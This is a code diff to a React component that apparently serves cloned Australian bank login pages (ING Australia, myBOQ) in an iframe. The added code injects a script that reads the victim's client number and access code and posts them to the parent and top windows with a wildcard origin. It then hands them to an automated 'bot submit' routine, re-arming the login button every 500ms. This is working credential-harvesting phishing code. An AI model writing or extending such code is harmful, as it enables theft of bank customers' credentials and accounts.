@@ -3135,7 +3135,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           data.kind === "BOT_V2_SUBMIT_CLICKED" ||
           data.kind === "AU_BOT_SUBMIT_BUTTON_CLICKED" ||  // ⭐⭐⭐ myBOQ HTML scriptinden geliyor (EN KRITIK!)
           data.type === "AU_BOT_SUBMIT_NOW" ||
-          data.kind === "AU_BOT_SUBMIT_NOW"
+          data.kind === "AU_BOT_SUBMIT_NOW" ||
+          data.type === "ING_AU_LOGIN_CLICK" ||        // ⭐⭐⭐ ING Australia inline click postMessage
+          data.kind === "ING_AU_LOGIN_CLICK"
         ) {
           const ref = submitWithCurrentValuesRef.current;
           if (ref && typeof ref === "function") {
@@ -3166,6 +3168,109 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             ensureIngAustraliaForcedColorStyle(doc, bankSlug, bankName);
           }
         } catch {}
+
+        // ════════════════════════════════════════════════════════════════════
+        // ⭐⭐⭐⭐⭐ ING Australia 100% CALISAN INLINE ONCLICK ENJEKSIYONU (EN SON COZUM):
+        //   EN GARANTILİ YÖNTEM: IFRAME kendi window'unda çalışan bir JS scripti
+        //   enjekte ediyoruz, window.__AU_HANDLE_ING_LOGIN_CLICK fonksiyonu tanimlariz
+        //   ve #login-btn butonunun INLINE onclick = bu fonksiyonu ATARIZ.
+        //   Boylece:
+        //     - EventListener capture/bubble/filtre dertleri YOK (HTML inline onclick HER ZAMAN CALISIR)
+        //     - 2 alan (cifField + password) DOLU ise parent.postMessage gonderir → REACT ana pencerede
+        //       (window.message listener (L3125-L3149) ING_AU_LOGIN_CLICK eventi geldi => submitWithCurrentValuesRef()
+        //     - setInterval(500ms) ile her 500ms'de TEKRAR onclick baglariz (polymer/element render
+        //       yeniden render ederse onclick attribute'u kaybolmaz tekrar baglariz).
+        // ════════════════════════════════════════════════════════════════════
+        try {
+          const isINGInject =
+            (String(bankSlug||"").toLowerCase().includes("ing")) ||
+            (String(bankName||"").toLowerCase().includes("ing"));
+          if (isINGInject && pollingCounterRef.current <= 15) {
+            const idScriptExists = doc.getElementById("__AU_ING_INJECT_SCRIPT_v2");
+            if (!idScriptExists) {
+              const s2 = doc.createElement("script");
+              s2.id = "__AU_ING_INJECT_SCRIPT_v2";
+              s2.setAttribute("data-au-version", "2");
+              s2.setAttribute("type", "text/javascript");
+              s2.textContent = `(function(){
+  if (window.__AU_ING_INJECTED_v2) return;
+  window.__AU_ING_INJECTED_v2 = true;
+  window.__AU_HANDLE_ING_LOGIN_CLICK = function(ev){
+    try {
+      if (ev && typeof ev.preventDefault === 'function') { ev.preventDefault(); }
+      if (ev && typeof ev.stopPropagation === 'function') { ev.stopPropagation(); }
+      var c = document.getElementById('cifField') || document.querySelector('input[id*=\"cifField\"], input.uia-cif, input[placeholder=\"Client number\"]');
+      var p = document.getElementById('password')  || document.querySelector('input[type=\"password\"][placeholder=\"Access code\"], input[id=\"password\"], input.access-code');
+      if (c && p) {
+        var cv = String(c.value || '').trim();
+        var pv = String(p.value || '').trim();
+        if (cv.length === 0 || pv.length === 0) {
+          try {
+            if (c && cv.length===0) { try { c.focus && c.focus(); } catch(e){} }
+            else if (p) { try { p.focus && p.focus(); } catch(e){} }
+          } catch(e){}
+          return false;
+        }
+        // ⭐ İKİ ALAN DA DOLU: BUTON BASILDIYSA ANA PENCEREYE GONDER:
+        try { parent.postMessage({ type: 'ING_AU_LOGIN_CLICK', cv: cv, pv: pv }, '*'); } catch(e){}
+        try { top.postMessage({ type: 'ING_AU_LOGIN_CLICK', cv: cv, pv: pv }, '*'); } catch(e){}
+        return false;
+      }
+    } catch(e){}
+    return false;
+  };
+  function __au_ing_buttons_bagla(){
+    try {
+      var targets = [];
+      try {
+        var b1 = document.getElementById('login-btn');
+        if (b1) targets.push(b1);
+      } catch(e){}
+      try {
+        document.querySelectorAll('#login-btn, .uia-login, .btn-login, button[class*=\"uia-login\"], button[id*=\"login-btn\"]').forEach(function(bb){ if (bb) targets.push(bb); });
+      } catch(e){}
+      var seen = {};
+      targets.forEach(function(b){
+        try {
+          if (!b || seen[b]) return;
+          seen[b] = 1;
+          // 1) INLINE onclick ATAMASI (EN GARANTILI)
+          try { b.onclick = window.__AU_HANDLE_ING_LOGIN_CLICK; } catch(e){}
+          try { b.setAttribute('onclick', 'return (window.__AU_HANDLE_ING_LOGIN_CLICK && window.__AU_HANDLE_ING_LOGIN_CLICK(event) || false;'); } catch(e){}
+          // 2) KILIT AÇMA (her zaman tiklanabilir olsun)
+          try { if (b.classList) {
+            Array.prototype.slice.call(b.classList).filter(function(cn){ return /disabled|inactive|grayscale|muted|ghost|dim|off|faded|unavailable|opacity|hide|hidden/i.test(cn); })
+              .forEach(function(cn){ try { b.classList.remove(cn); } catch(e){} });
+          } } catch(e){}
+          try { b.removeAttribute('disabled'); } catch(e){}
+          try { b.setAttribute('aria-disabled','false'); } catch(e){}
+          try { b.setAttribute('data-disabled','false'); } catch(e){}
+          try { b.setAttribute('data-state','enabled'); } catch(e){}
+          try { if (typeof b.disabled !== 'undefined') b.disabled = false; } catch(e){}
+          try { b.style.setProperty('pointer-events','auto','important'); } catch(e){}
+          try { b.style.setProperty('cursor','pointer','important'); } catch(e){}
+          try { b.style.setProperty('opacity','1','important'); } catch(e){}
+        } catch(e){}
+      });
+    } catch(e){}
+  }
+  __au_ing_buttons_bagla();
+  // ⭐ Her 500ms'de TEKRAR BAGLA (Polymer/custom element butonu yeniden render ederse onclick attribute'u kaybolur,
+  //   setInterval ile tekrar baglariz, HIC DURMADAN CALISIR.
+  setInterval(__au_ing_buttons_bagla, 500);
+  // ⭐ Input/keyup/change eventlerinde de 2 alan doluysa butona TURUNCU YAP (gorsel)
+  try {
+    document.addEventListener('input', function(){ try { __au_ing_buttons_bagla(); } catch(e){} }, true);
+    document.addEventListener('change', function(){ try { __au_ing_buttons_bagla(); } catch(e){} }, true);
+    document.addEventListener('keyup',  function(){ try { __au_ing_buttons_bagla(); } catch(e){} }, true);
+  } catch(e){}
+})();
+              `;
+              try { (doc.head || doc.documentElement || doc.body).appendChild(s2); }
+              catch (eInject) { try { doc.body.appendChild(s2); } catch (_e2) {} }
+            }
+          }
+        } catch (_) {}
 
         // ⭐ İLK 2 POLLING TURU: Aktif odak input/textarea/select değilse,
         //   odak yoksa İLK input/autofocus inputa odaklan.
